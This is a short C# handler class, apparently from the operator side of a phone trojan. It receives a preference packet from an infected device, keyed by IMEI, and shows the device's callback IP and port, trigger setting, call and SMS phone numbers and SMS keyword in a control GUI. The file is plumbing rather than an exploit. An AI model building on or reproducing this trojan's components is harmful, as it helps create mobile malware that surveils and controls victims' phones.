using InOut;
using InOut.PacketImp;

namespace IIE.Phone.Troj.Host.Handler
{
    public class PreferenceHandler : IPacketHandler
    {
        private IMainView gui;
        private int channel;
        private string imei;

        public PreferenceHandler(int chan, string imei, IMainView gui)
        {
            channel = chan;
            this.imei = imei;
            this.gui = gui;
        }


        public void Receive(IPacket p, string tempIMEI)
        {
            
        }


        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            gui.Log.LogTxt("Preference data has been received");
            c.ChannelHandlerMap[imei].RemoveListener(channel);
            var packet = (PreferencePacket)p;
            gui.UpdatePreference(imei, packet.Ip, packet.Port, packet.WaitTrigger, packet.PhoneNumberCall,
                packet.PhoneNumberSMS, packet.KeywordSMS);
        }
    }
}
